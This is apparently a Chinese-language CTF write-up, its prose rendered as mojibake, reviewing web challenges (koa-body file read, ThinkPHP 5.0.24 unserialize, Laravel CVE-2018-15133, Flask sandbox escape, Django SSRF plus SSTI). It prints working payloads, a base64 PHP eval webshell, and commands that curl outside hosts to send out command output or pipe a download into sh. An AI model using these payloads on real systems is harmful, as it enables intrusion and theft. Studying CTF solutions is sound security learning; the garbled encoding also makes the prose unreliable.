:(è¿™æ¬¡æ¯”èµ›éš¾åº¦ç›¸æ¯”ä¸Šæ¬¡RCTFçš„éš¾åº¦å¥½äº†ç‚¹ã€‚ä½†æ˜¯æœ€åè¿˜æ˜¯åªèƒ½æ„Ÿæ…¨è‡ªå·±tclã€‚åšå‡ºæ¥çš„åªæœ‰CloudDiskè·ŸUnsafeDefenseSystem.ç›¸æ¯”ä¸‹solveæ¯”è¾ƒå¤šçš„pythonsandboxè‡ªå·±åè€Œå› ä¸ºæ€»è§‰å¾—pyjailå¤ªè€å¥—ä¸å»ç ”ç©¶,è¿ä¸‹æ‰‹éƒ½åšä¸åˆ°â€¦â€¦èµ›åè¿˜æ˜¯æŠŠèƒ½å¤ç°çš„éƒ½å¤ç°ä¸‹å§ã€‚ CloudDiskNodejsç»å…¸æ¼æ´ã€‚å…¶å®å› ä¸ºæœ€è¿‘ç»ƒæ‰‹å‡ºäº†äº›Nodejsçš„é¢˜ç›®,ç°åœ¨æ„Ÿè§‰Nodeå†™èµ·æ¥å·¨èˆ’æœ,ä¼°è®¡æš‘å‡ä¼šé•¿æœŸç»ƒæ‰‹ä¸€äº›nodeé¡¹ç›®ã€‚ é¦–å…ˆå…ˆä¸è¯´é¢˜ç›®æœ¬èº«,å•ä»æœ€è¿‘å†™nodejsåº”ç”¨expresså…¥æ‰‹ï¼Œå‘ç°expressæ¡†æ¶ä¸€ä¸ªå¯ç”¨æ”¯æŒæ•°æ®çš„å†™æ³•ï¼š 1234const bodyParser = require('body-parser');app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;)); è¿™é‡Œæ˜¯è¡¨ç¤ºæˆ‘ä»¬çš„åº”ç”¨æ”¯æŒapplication/jsonè·Ÿapplication/x-www-form-urlencodedä¼ è¾“çš„æ•°æ®.ç›¸ä¿¡åœ¨poståŒ…æ—¶è§è¿‡ä¸å°‘æ¬¡äº†ã€‚è€Œè®©æˆ‘æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜çš„èµ·å› æ˜¯åœ¨ä¸€æ¬¡CTFæ¯”èµ›ä¸­ã€‚æœ¬æ¥é‚£é¢˜æ˜¯Nodejsååºåˆ—åŒ–ä½œä¸ºè€ƒç‚¹ï¼Œä½†æ˜¯æˆ‘å¼€å§‹åœ¨éšæ„æµ‹è¯•æ—¶å‘ç°äº†å¦ä¸€ä¸ªæ¼æ´ï¼Œä¸è¿‡å› ä¸ºä¸æ˜¯æ­£ç¡®æ€è·¯å°±æ²¡æ·±å…¥ã€‚åæ¥getshellæ—¶æŠŠæºç æ‹¿ä¸‹æ¥ä»”ç»†é˜…è¯»ï¼Œå‘ç°é—®é¢˜å°±æ˜¯å‡ºåœ¨è¿™ä¸Šé¢ã€‚å¯¹äºNodejsè€Œè¨€,ä¼ è¾“jsonæ•°æ®æ˜¯éå¸¸å±é™©çš„ä¸€ä»¶äº‹ã€‚å› ä¸ºNodejsæœ¬èº«å°±æ˜¯jsçš„ä¸€ä¸ªruntimeç¯å¢ƒ,javascriptçš„å¯¹è±¡å†™æ³•å°±æ˜¯{&quot;sth&quot;:&quot;byc&quot;}ä¹‹ç±»çš„ã€‚è€Œjsonæ•°æ®ä¸è¿™çš„æ ¼å¼ä¸€è‡´æ€§å¾€å¾€å¯¼è‡´ä¼ è¾“çš„æ•°æ®ä¼šè¢«è¿›è¡Œæ··æ·†ã€‚ä¸€æ—¦ç¨‹åºå†™æ³•æœ‰äº†é—®é¢˜ï¼Œå°±å¯èƒ½è¯¯å–æŸä¸ªç”¨æˆ·ä¼ è¾“çš„å€¼ä½œä¸ºå¯¹è±¡çš„å±æ€§ï¼Œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œå˜é‡æ··æ·†ï¼ŒNosqlæ³¨å…¥ä¹‹ç±»çš„ã€‚ å›åˆ°é¢˜ç›®ã€‚ç”±äºæœ‰æºç ,æ‰€ä»¥ç›´æ¥ä¸Šæ‰‹åˆ†æã€‚å½“ç„¶ç”±äºNodejsçš„ç‰¹æ€§ï¼Œä»¥åŠæœ¬é¢˜æ‰€æ‰§è¡Œçš„ä¸Šä¼ ä¸‹è½½çš„è¿‡ç¨‹,åœ¨ä¾èµ–æ­£å¸¸çš„æƒ…å†µä¸‹ä¸å¯èƒ½å‡ºç°æ³¨å…¥ï¼Œè·¯å¾„ç©¿è¶Šä¹‹ç±»çš„é—®é¢˜ã€‚åªå¯èƒ½æ˜¯æ–‡ä»¶è¯»å–äº†ã€‚é‚£ä¹ˆé—®é¢˜å‡ºåœ¨å“ªå‘¢ 1234const file = ctx.request.body.files.file;const reader = fs.createReadStream(file.path);...const upStream = fs.createWriteStream(filePath); æ³¨æ„è¿™é‡Œ,å®ƒçš„å–å€¼æ˜¯ä»ctx.request.bodyä¸­å–çš„ã€‚è€Œè¿™å°±æœ‰å¯èƒ½å‡ºç°ä¸Šé¢æåˆ°çš„é—®é¢˜ã€‚å‡å¦‚æˆ‘ä»¬ä¼ è¾“jsonæ•°æ®fileså¹¶ç½®å…¶pathå±æ€§ä¸ºä»»æ„æ–‡ä»¶ã€‚æˆ‘ä»¬ä¹‹åä¸‹è½½çš„æ–‡ä»¶å°±æ˜¯æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶äº†ã€‚ æ•…è¯»å–ä¹‹ 1&#123;\"files\":&#123;\"file\":&#123;\"path\":\"/app/flag\"&#125;&#125;&#125; åæ¥æ ¹æ®é˜Ÿå‹æ•™çš„åº”è¯¥æ˜¯ä¸ªkoa-bodyçš„é—®é¢˜ã€‚éš¾æ€ªæˆ‘æœ¬åœ°å½“æ—¶è¿ä¸Šä¼ éƒ½è·‘ä¸èµ·æ¥ã€‚å› ä¸ºæ˜¯ä¸ª2.xç‰ˆæœ¬çš„koa.å‡ºé¢˜äººä¸ç»™package.jsonä¼°è®¡æ˜¯æ€•ä¸€çœ¼çœ‹å‡ºç‰ˆæœ¬é—®é¢˜å§ã€‚ UnsafeDefenseSystemè¯´çœŸçš„ã€‚è¿™é¢˜è¿™æ¬¡çœŸçš„æ˜¯å¿ƒæ€èµ·ä¼æœ€å¤§çš„ä¸€é¢˜ã€‚è¯´å®è¯æˆ‘ä»¬æœ¬æ¥æœ‰æ‹¿ä¸‹ä¸€è¡€çš„æœºä¼šçš„ã€‚ç»“æœå› ä¸ºå°ç»†èŠ‚å°±å¯¼è‡´è‡ªå·±æµªè´¹äº†æ•°ä¸ªå°æ—¶ã€‚ç¬¬ä¸€å¤©æ™šä¸Š9ç‚¹å·¦å³æˆ‘ä»¬å°±å·²ç»åœ¨æ‰“tp5.0.24çš„ååºåˆ—åŒ–äº†ã€‚ç»“æœä¸€ç›´å°±ä»¥å¤±è´¥å‘Šç»ˆ,ç¬¬äºŒå¤©æ‰ç»ˆäºæ˜ç™½é—®é¢˜ä¸æ˜¯å‡ºåœ¨expä¸Š.å…·ä½“åé¢å†è¯´å§ã€‚ è€å®è¯´è¿™é¢˜æ•´ä½“è„‰ç»œä¸‹æ¥è·Ÿæˆ‘å¹³æ—¶æ¸—é€çš„æ€è·¯å¾ˆç›¸ä¼¼ï¼Œæ‰€ä»¥åœ¨å‰é¢è¿›åº¦éå¸¸é¡ºåˆ©ï¼Œæ²¡æœ‰å¡å£³ã€‚ ç¬¬ä¸€æ­¥æ˜¯è®¿é—®ç½‘å€ã€‚å‘ç°ä½œäº†ä¸ªè·³è½¬ã€‚åŒæ—¶æé†’äº†log.txtçš„å­˜åœ¨.(å°±æ˜¯å› ä¸ºæˆ‘çœ‹æ‰äº†log.txtå¯¼è‡´åé¢æµªè´¹çš„å·¨é‡æ—¶é—´ï¼Œè¯¥æ‰“) å› ä¸ºè·³è½¬åˆ°/public/testã€‚æ‰€ä»¥ç›´æ¥è®¿é—®è¿™ä¸ªè·¯ç”±ã€‚å¾—åˆ°ä¸€ä¸ªç½‘é¡µã€‚éšä¾¿ç‚¹ç‚¹åä¼¼ä¹æ˜¯é™æ€çš„ã€‚è¿™æ—¶å€™æœæ–­åˆ‡ctrl+uçœ‹æºç ,å¹¶ä¸”ctrl+fæœç´¢phpã€‚çœ‹æœ‰æ²¡æœ‰åŠ¨æ€æ–‡ä»¶å­˜åœ¨ã€‚æœç„¶åœ¨æ³¨é‡Šä¸­æ‰¾åˆ°äº†ã€‚ 1&lt;!-- Admin:/public/nationalsb/login.php --&gt; è®¿é—®åå‘ç°æ˜¯ä¸ªauthçš„ç™»å½•ã€‚ä½†æ˜¯ä»»æ„ç”¨æˆ·å¯†ç éƒ½èƒ½è¿›ã€‚ä¸è¿‡æ¯•ç«Ÿæˆ‘ä»¬æ”¶è·äº†ä¸€ä¸ªæ–°è·¯ç”±/public/nationalsb/æœæ–­å»è¿™çœ‹çœ‹ã€‚ åŒæ ·è¿˜æ˜¯ç›´æ¥çœ‹ç½‘é¡µæºç ,å‘ç°åŠŸèƒ½åˆæ˜¯ä¸ªé™æ€çš„ã€‚ä½†æ˜¯æœ‰ä¸ªjsæ–‡ä»¶ã€‚ç‚¹è¿›å»æ”¶è·æç¤ºã€‚ 123/username:Admin1964752//password:DsaPPPP!@#amspe****//Secret **** is your birthday æ˜¾ç„¶å¯†ç åå››ä½è¦çˆ†ç ´ã€‚éšä¾¿å†™ä¸ªè„šæœ¬å‡ºåå››ä½å¥½äº†ã€‚è¿™ç§çˆ†ç ´é‡ç›¸æ¯”ä¹‹å‰hacktheboxçš„é‡å·²ç»éå¸¸å‹å¥½ã€‚ æœ€åçˆ†å‡ºå¯†ç åç¼€1221.ç™»å½•æ—¶çš„å†…å®¹æç¤ºæˆ‘ä»¬å¯ä»¥postfile.å®éªŒåæ˜¯ä¸ªlfi.ä¸è¿‡æ˜¾ç„¶åšäº†å¤„ç†ï¼Œä¸èƒ½è¯»å–/flagè·Ÿå¸¦æœ‰logçš„(è¿™é‡Œæˆ‘ä»¥ä¸ºæ˜¯banäº†login,ä½†åæ¥å‘ç°æ˜¯banäº†logâ€¦).é‚£ä¹ˆåŸºäºè¿™æ˜¯ä¸ªtp5.0.24.æœæ–­dumpæºç å¥½äº† ç°åœºä¸‹äº†ä¸ªtp5.0.24çš„æºç ã€‚æœ€é‡è¦çš„è‚¯å®šæ˜¯æ§åˆ¶å™¨æºç ã€‚æ‰€ä»¥è¯»å–application/index/controller/Index.php 12345678&lt;?php ?&gt;#r=requests.get(un_url+tmp_unserialize_payload)r=requests.get(un_url+unserialize_payload)r=requests.post('http://39.99.41.124/public/3b58a9545013e88c7186db11bb158c44.php',data=&#123; 'ccc':\"system('cat /flag');\"&#125;)print(r.text) æœ€åå†å›è¿‡å¤´è§£é‡Šä¸‹ä½¿ç”¨è¿‡æ»¤å™¨çš„åŸå› å§ã€‚å› ä¸ºä¹‹å‰éƒå¸ˆå‚…å®æˆ˜ä¸­é‡åˆ°äº†ï¼Œæ‰€ä»¥æœ‰è¿™ä¸¤ä¸ªå‘ç‚¹ short open tag1234&lt;?cuc&#x2F;&#x2F;000000000000 rkvg();?&gt;æŠ¥é”™ Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING) å› ä¸ºé»˜è®¤æ”¯æŒçŸ­æ ‡ç­¾çš„åŸå› ï¼Œç”±äº &lt;?cucï¼Œä¹Ÿå°±æ˜¯ &lt;?åé¢å‡ºç°äº† cuc å­—ç¬¦ä¸²ï¼Œä½¿å¾—ä»£ç è¯­æ³•ä¸åˆæ ¼ï¼Œphp æŠ¥é”™é€€å‡ºæ‰§è¡Œã€‚ å› æ­¤,è¦ç´ å…¶å®å°±æ˜¯ç»•è¿‡è¿™ä¸ªexit()ã€‚è¦æƒ³&lt;,?ä¸è¢«è¯†åˆ«ã€‚æˆ‘ä»¬å¯ä»¥ç”¨string.strip_tagsè¿‡æ»¤å™¨æ¥è§£å†³ã€‚ä½†æ˜¯è¦è®©shellä»£ç &lt;?php eval(xxx)ä¸è¢«è¿‡æ»¤ã€‚æˆ‘ä»¬å¯ä»¥ç”¨convert.base64-decodeè¿‡æ»¤å™¨æ¥è§£å†³ã€‚æ‰€ä»¥è¦ç´ å°±æ˜¯ä¸¤ç§è¿‡æ»¤å™¨æ­é…ã€‚ä½†æ˜¯è¿™é‡Œéœ€è¦è§£å†³çš„æœ€é‡è¦çš„é—®é¢˜ï¼Œå°±æ˜¯base64è§£é‡Šå™¨é‡åˆ°ç­‰å·å°±ç›´æ¥ç»“æŸäº†ã€‚æ‰€ä»¥è¿˜è¦æƒ³åŠæ³•è®©æ–‡ä»¶åä¸­ä¸å‡ºç°=. è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨phpé»˜è®¤æ”¯æŒçš„iconvè¿‡æ»¤å™¨ã€‚ä¼˜åŠ¿åœ¨äºï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨iconvè¿™ä¸ªshellå‘½ä»¤æ”¯æŒçš„æ‰€æœ‰ç¼–ç è¿›è¡Œè½¬æ¢ã€‚è€Œä¹‹å‰æˆ‘ä»¬åœ¨å„ç§æ¯”èµ›ä¸­åº”è¯¥ä¹Ÿæ¥è§¦è¿‡è½¬ç ä¸ºutf-7çš„webshelläº†ã€‚æ¯”å¦‚XNUCA 12345678&lt;?php$cc&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;123.txt&#39;;file_put_contents($cc,&#39;&#x3D;&#39;);&#x2F;**123.txt å†™å…¥çš„å†…å®¹ä¸º: +AD0-**&#x2F; +AD0-å¯ä»¥è¢«base64è¿‡æ»¤å™¨è§£ç ,æ‰€ä»¥è¯´æˆ‘ä»¬å°±èƒ½æˆåŠŸå†™å…¥shelläº†ã€‚ 1php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&#x2F;..&#x2F; è€Œä¸”ç”Ÿæˆçš„æ–‡ä»¶åä¸ä¼šåƒrot13é‚£æ ·æœ‰å¥‡æ€ªçš„å‰ç¼€ã€‚æˆ‘ä»¬ç›´æ¥å¾—åˆ°md5ä½œä¸ºæ–‡ä»¶åçš„phpã€‚(å€¼å–å†³äºä½ çš„fileç±»ä¸­çš„$tagå€¼,å¾ˆå¤šexpé‡Œå°±æ˜¯true.æ‰€ä»¥ç®—md5(â€˜tag_â€™+md5(â€˜1â€™))å°±è¡Œäº†) å½“ç„¶å› ä¸ºbase64æ˜¯8byteè§£ç ã€‚å®é™…éœ€è¦æ ¹æ®è‡ªå·±çš„payloadè¡¥è¶³a.å½“ç„¶æœ€å¤šè¡¥è¶³4ä¸ªå°±è¡Œã€‚æ‰€ä»¥FUZZä¸‹å°±èƒ½è§£å†³é—®é¢˜ æ‰€ä»¥è¯´çœŸçš„æ‹‰èƒ¯ã€‚è¿˜é ç€éƒå¸ˆå‚…çš„è€æœ¬ä»¥ä¸ºå å°½å…ˆæœºã€‚å´å› ä¸ºä¸€äº›å°ç»†èŠ‚èµ°å…¥è¯¯åŒºã€‚å¯èƒ½è¿™å°±æ˜¯æ¸—é€å§ã€‚ bestlanguageæˆ‘è¦æ˜¯å®¡è¿‡laravel5.8RCEä»¥å¤–çš„é“¾å­ä¼šæ˜¯è¿™ä¸ªåŠæ ·.jpgâ€¦..ç¬¬äº”ç©ºé—´çš„laravelå› ä¸ºå®¡è¿‡é“¾å­æ‰€ä»¥ç›´æ¥ç§’äº†ã€‚è¿™ä¸ªå› ä¸ºæ²¡å®¡è¿‡çœ‹éƒ½æ²¡çœ‹æ‡‚,å±å®æ‹‰èƒ¯ã€‚ å…¶å®å°±æ˜¯CVE-2018-15133.å› ä¸º.envé‡Œç»™äº†keyæ‰€ä»¥å°±èƒ½ç›´æ¥æ‰“ã€‚payloadå¯ä»¥ç”¨ç¬¬äº”ç©ºé—´çš„payloadã€‚å› ä¸ºä»¥å‰åœ¨phpæ¡†æ¶ç»ƒä¹ ä¸­æŠ¤ç½‘æ¯çš„éé¢„æœŸé‡Œæè¿‡è¿™ä¸ªé“¾å­äº†ã€‚æ‰€ä»¥å°±ä¸æ·±è°ˆäº†ã€‚ç„¶åç¬¬äº”ç©ºé—´å°±æ˜¯æ”¹äº†ä¸€ä¸ªç±»çš„destructã€‚æ¢äº†å¦ä¸€ä¸ªç±»çš„destructè¿˜èƒ½è§¦å‘__getã€‚è¿™é‡Œå¯ä»¥ç”¨ä¸¤ä¸ªç±»éƒ½èƒ½ç”¨ã€‚ payloadç”¨ggcç”ŸæˆæŒºçœäº‹çš„ã€‚å½“ç„¶ç›´æ¥ç”¨ä¹‹å‰rceexpçš„ä¹Ÿå¯ä»¥ 1O:40:&quot;Illuminate\\Broadcasting\\PendingBroadcast&quot;:2:&#123;s:9:&quot;*events&quot;;O:28:&quot;Illuminate\\Events\\Dispatcher&quot;:1:&#123;s:12:&quot;*listeners&quot;;a:1:&#123;s:28:&quot;curl 120.27.246.202&#x2F;&#96;whoami&#96;&quot;;a:1:&#123;i:0;s:6:&quot;system&quot;;&#125;&#125;&#125;s:8:&quot;*event&quot;;s:28:&quot;curl xxxxx&#x2F;&#96;cat &#x2F;flag&#96;&quot;;&#125; base64åè”åˆkeyé€ç»™æŸcvephpå³å¯ã€‚å½“ç„¶ä¹Ÿèƒ½ç›´æ¥è°ƒç”¨ç”Ÿæˆã€‚å…¶ä»–æˆ˜é˜Ÿå¤§ä½¬çš„wpå†™çš„è‚¯å®šæ¯”æˆ‘å¥½ã€‚æˆ‘å°±ä¸æ”¾expäº†ã€‚ çœ‹åˆ°é¢„æœŸè§£æ˜¯é€šè¿‡è¦†ç›–sessionååºåˆ—åŒ–ã€‚è¿™å°±èƒ½è§£é‡Šindexçš„è·¯ç”±è®¾ç½®äº†ã€‚å¯æƒœäº†æœ¬æ¥ä¸€ä¸ªå¾ˆéš¾ç»•è¿‡çš„é¢˜éƒ½è¢«å¤§å®¶åˆ©ç”¨æ¡†æ¶çš„æ´æ‰“æˆRCEäº†â€¦â€¦ pysandbox 1&amp;2é¢˜ç›®è™½ç„¶æ˜¯æ²™ç›’é€ƒé€¸ã€‚ä½†å…¶å®ç”¨çš„expè‡ªå·±ä¹‹å‰ä¹Ÿç”¨è¿‡.çœ‹å®˜æ–¹wpç”¨çš„å½“åˆtokyowesternçš„è„šæœ¬å€’æ˜¯æŒºæƒŠè®¶çš„ã€‚å› ä¸ºè‡ªå·±å‰ä¸ä¹…åšå®‰æ’æ¯”èµ›æ—¶ä¹Ÿç”¨è¿‡shrineé‚£é¢˜çš„è„šæœ¬ã€‚æ€»ä¹‹å°±æ˜¯èƒ½ç›´æ¥fuzzå‡ºä¸€æ¡ç»§æ‰¿é“¾ï¼Œç›¸å½“å¥½ç”¨ã€‚ å…ˆæ¥å­¦ä¹ ä¸‹dalaoä»¬çš„è®¾ç½®é™æ€ç›®å½•çš„åšæ³• 123&#x2F;?POST&#x3D;%2fcmd&#x3D;app.static_folder&#x3D;request.args[request.method] è®¾ç½®é™æ€ç›®å½•ä¸º/ä¹‹åå³å¯è®¿é—®static/flag ç„¶åå°±æ˜¯RCEäº†ã€‚è¿™é‡Œå…¶å®è‡ªå·±ä¹‹å‰FUZZè¿‡ä¸€æ¬¡ã€‚å°±æ˜¯ç”¨shrineé‚£ä¸ªè„šæœ¬fuzzå‡ºä¸€æ¡è·å–appçš„é“¾ã€‚ å½“ç„¶è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•ã€‚åˆ†äº«ä¸‹W4nderå¸ˆå‚…çš„http://phoebe233.cn/index.php/archives/53/#pysandbox2å› ä¸ºordæ˜¯åœ¨builtinsé‡Œçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–ã€‚ä¹‹ååŒç†å†è¦†ç›–æ‰è·¯ç”±å‡½æ•°ã€‚åˆ©ç”¨lambdaåŒ¿åå‡½æ•°ã€‚éå¸¸å·§å¦™ã€‚ å¦‚æœæ˜¯å®˜æ–¹çš„æ€è·¯,è·Ÿæˆ‘ä¸€å¼€å§‹çš„æƒ³æ³•åº”è¯¥å·®ä¸å¤šã€‚é“ç†å°±æ˜¯å‡½æ•°åŠ«æŒã€‚å½“ç„¶å‰ææ˜¯èƒ½è·å–åˆ°å¯æ§å˜é‡çš„æ¨¡å—ã€‚å‡ºé¢˜äººæ‰¾çš„æ˜¯werkzeug.urls.url_parseã€‚è¿™é‡Œæˆ‘ä¹Ÿç”¨shrineå½“æ—¶çš„è„šæœ¬æ¥fuzzä¸‹ã€‚ search.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# search.pydef search(obj, max_depth): visited_clss = [] visited_objs = [] def visit(obj, path='obj', depth=0): yield path, obj if depth == max_depth: return elif isinstance(obj, (int, float, bool, str, bytes)): return elif isinstance(obj, type): if obj in visited_clss: return visited_clss.append(obj) print(obj) else: if obj in visited_objs: return visited_objs.append(obj) # attributes for name in dir(obj): if name.startswith('__') and name.endswith('__'): if name not in ('__globals__', '__class__', '__self__', '__weakref__', '__objclass__', '__module__'): continue attr = getattr(obj, name) yield from visit(attr, '&#123;&#125;.&#123;&#125;'.format(path, name), depth + 1) # dict values if hasattr(obj, 'items') and callable(obj.items): try: for k, v in obj.items(): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(k)), depth) except: pass # items elif isinstance(obj, (set, list, tuple, frozenset)): for i, v in enumerate(obj): yield from visit(v, '&#123;&#125;[&#123;&#125;]'.format(path, repr(i)), depth) yield from visit(obj) app.py 1234567891011121314151617181920import flaskimport osfrom flask import requestfrom search import searchapp = flask.Flask(__name__)@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): for path, obj in search(request, 10): if str(obj)==\"werkzeug.urls\": return pathif __name__ == '__main__': app.run(debug=True) è¿™é‡Œå› ä¸ºè¦è·å–åˆ°werkzeug.urlsè¿™ä¸ªç±»ã€‚æ‰€ä»¥æ”¹æˆif str(obj)==&quot;werkzeug.urls&quot;ç„¶åå†æœ¬åœ°è·‘èµ·è¿™ä¸ªflask.è®¿é—®ä¸‹/shrine/è¿™ä¸ªè·¯ç”±+éšä¾¿ä»€ä¹ˆã€‚æ–¹ä¾¿å®ƒè·å–åˆ°requestã€‚è¿™æ ·å°±èƒ½è¿”å›ä¸€æ¡åˆ©ç”¨é“¾ã€‚ 1app.__class__._get_current_object.__globals__[&#39;ClosingIterator&#39;].close.__globals__[&#39;uri_to_iri&#39;].__globals__[&#39;__name__&#39;] ç„¶åä¸èƒ½ç”¨å¼•å·å½“ç„¶åªèƒ½æ˜¯request.argsç»•è¿‡(è·Ÿä¸Šé¢ä¸€æ ·)ã€‚ä½¿ç”¨request.hostï¼Œrequest.headersä¹‹ç±»çš„æŠŠè¦ä¼ çš„å€¼æ”¾headeré‡Œå³å¯ã€‚åŠ«æŒurl_parse()è·å–å‡½æ•°eval()ã€‚ç„¶ååé¢url_parseå› ä¸ºç›´æ¥å¤„ç†è·¯ç”±ã€‚é‚£å°±å¯ä»¥ç›´æ¥è·¯ç”±ä¼ å‘½ä»¤RCEã€‚__import__(&#39;os&#39;).system(&#39;curl$IFSxxxxx|sh&#39;) é¢˜ç›®å…¶å®ä¸éš¾ï¼Œä½†æ˜¯è‡ªå·±åæ¥çœ‹éƒ½æ²¡çœ‹,è·‘å»çœ‹asisäº†ã€‚ jsonhubé¢˜ç›®å› ä¸ºweb1æ˜¯djangoçš„åŸå› ï¼Œå¯¼è‡´è‡ªå·±ç¬¬ä¸€æ­¥ä¸ç†Ÿæ‚‰è€Œç›´æ¥æ–­æ‰æ€è·¯ã€‚åé¢çš„ssrfä¸sstiåè€Œè¿˜æœ‰ç»éªŒ,åº”è¯¥å±äºè‡ªå·±ä¸ç†Ÿæ‚‰djangoçš„é—®é¢˜å§ã€‚ é¢˜ç›®å¼€å§‹çš„å‚æ•°æ³¨å…¥ 1&#123;&quot;username&quot;:&quot;byc_401&quot;,&quot;password&quot;:&quot;123&quot;,&quot;is_staff&quot;:1,&quot;is_superuser&quot;:1&#125; ä½¿ç”¨è¿™ä¸¤ä¸ªå­—æ®µåº”è¯¥æ˜¯å› ä¸ºUseræ¨¡å‹çš„ç¼˜æ•…ã€‚å±äºdjangoé»˜è®¤çš„ä¸¤ä¸ªåˆ—åã€‚åå°ç™»å½•åæ‹¿åˆ°token æ¥ä¸‹æ¥æ˜¯æºç ä¸­ä¸€ä¸ªéœ€è¦åˆ©ç”¨cveç»•è¿‡çš„éƒ¨åˆ†ã€‚ 123456789101112white_list = [\"39.104.19.182\"]def ssrf_check(url ,white_list): for i in range(len(white_list)): if url.startswith(\"http://\" + white_list[i] + \"/\"): return Falsedef flask_rpc(request): if request.META['REMOTE_ADDR'] != \"127.0.0.1\": return JsonResponse(&#123;\"code\": -1, \"message\": \"Must 127.0.0.1\"&#125;) å› ä¸ºåœ¨web2å­˜åœ¨æ˜æ˜¾çš„ssti,æˆ‘ä»¬æƒ³è¦è¾¾æˆsstiå¿…é¡»è¦åœ¨è¿™å¾€127.0.0.1è·‘åœ¨8000çš„flaskæ‰“ä¸€å‘ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬åˆ©ç”¨CVE-2018-14574è¿™ä¸ªä»»æ„urlè·³è½¬ï¼Œå³å¯ssrf. 1http://39.104.19.182//127%2e0.0.1:8000/rpc?methods=POST&amp;data=eyJudW0xIjoiIiwibnVtMiI6IiIsInN5bWJvbHMiOiJ7XHUwMDdiJzEnLl9fY2xhc3NfXy5tcm8oKVstMV0uX19zdWJjbGFzc2VzX18oKVs2NF0uX19pbml0X18uX19nbG9iYWxzX19bJ19fYnVpbHRpbnNfXyddWydldmFsJ10oXCJfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCAxMjAuMjcuMjQ2LjIwMi9gL3JlYWRmbGFnYCAnKVwiKX1cdTAwN2QifQ== åé¢æ‰“flaskçš„payloadä¸»è¦æ˜¯è§£å†³å¤§æ‹¬å·çš„é—®é¢˜ã€‚å› ä¸ºå®ƒæ˜¯é€šè¿‡get_jsonè·å–æ•°æ®çš„,å› æ­¤å…¶å®å¹¶ä¸å­˜åœ¨wafçš„é—®é¢˜ã€‚åªè¦ç”¨unicodeç»•è¿‡å³å¯ã€‚è¿™ç‚¹åœ¨Node.jsè·Ÿphpçš„json_decode()ç»•è¿‡æ—¶åº”è¯¥ç»å¸¸ç”¨åˆ°ã€‚ å¹¶ä¸”ï¼Œç”±äºweb2è·å–çš„å‚æ•°è¦æ±‚num1,2ä¸èƒ½æœ‰å°å†™å­—æ¯ã€‚symbolså¿…é¡»èƒ½åŒ¹é…åˆ°+\\-*/ä¹‹ä¸€ã€‚è¿™ä¸ªpayloadä¹Ÿç›´æ¥ç»•è¿‡äº†waf. 1&#123;\"num1\":\"\",\"num2\":\"\",\"symbols\":\"&#123;\\u007b [].__class__.__base__.__subclasses__()[64].__init__.__globals__['__builtins__']['eval'](\\\"__import__('os').system('curl xxxx/`/readflag` ')\\\")&#125;\\u007d\"&#125; è¿˜å¯ä»¥ç”¨num1={,symbols={PAYLOAD},num2=}æ¥è§£å†³é—®é¢˜ã€‚è‡³äºflaskè·å–åˆ°å«catch_warningsæ¨¡ç»„è¿›è€Œè·å–åˆ°evalçš„æ–¹æ³•ä¹Ÿæ˜¯è€ç”Ÿå¸¸è°ˆã€‚FUZZä¸‹å°±å¥½äº†ã€‚ æ‰€ä»¥è‡ªå·±ä¸»è¦æ˜¯å› ä¸ºdjangoå¤ªè¿‡é™Œç”Ÿ,å¯¼è‡´æ²¡èƒ½ä¸‹æ‰‹,è·‘å»çœ‹asisäº†ã€‚å‰©ä¸‹çš„éš¾åº¦å…¶å®è¿˜å¥½ã€‚ å°ç»“æš‚æ—¶å…ˆæŠŠwpæ”¾è¿™äº›å§ã€‚äº‰å–æ˜å¤©è‡ªå·±å†å¤šå¤ç°ä¸‹json_hubã€‚å› ä¸ºåˆšå¥½æŠŠhtbçš„travelåšå®Œäº†ï¼Œç®—æ˜¯äº†å´å¿ƒå¤´ä¸€ä»¶äº‹ã€‚åº”è¯¥èƒ½æŠ½ç©ºåšäº›å¤ç°å­¦ä¹ äº†ã€‚ å…³äºæœ€è¿‘çš„æ¯”èµ›å¿ƒé‡Œå…¶å®ä¸€ç›´æœ‰ç‚¹éš¾å—ã€‚æˆ˜é˜Ÿå·²ç»å¼€å§‹æ¢å±Šäº†,webæ–°ä¸€å±Šçš„å­¦å¼Ÿè¿˜æ²¡ä¸Šæ¥ï¼Œä½†æ˜¯å¹³æ—¶åœ¨æ‰“æ¯”èµ›çš„webæ‰‹å·²ç»å‡ ä¹å°±åªæœ‰æˆ‘è·Ÿzjyäº†ã€‚æ¯æ¬¡xctfæ‰“åˆ°ä¸€åŠæ€»æ„Ÿè§‰å½¢å•å½±åª,ç›¸æ¯”äººå°‘è€Œè¨€æ›´å¤šçš„æ˜¯æ„Ÿæ…¨è‡ªå·±tclã€‚æ¯æ¬¡éƒ½ä¼šé‡åˆ°æ„Ÿè§‰è‡ªå·±æ€ä¹ˆæ²¡æ—©ç‚¹å­¦çš„çŸ¥è¯†ã€‚å¿ƒé‡Œè¿‡æ„ä¸å»ã€‚ ä¸è¿‡æ¯•ç«Ÿæ‰“æ¯”èµ›æ˜¯å­¦ä¹ 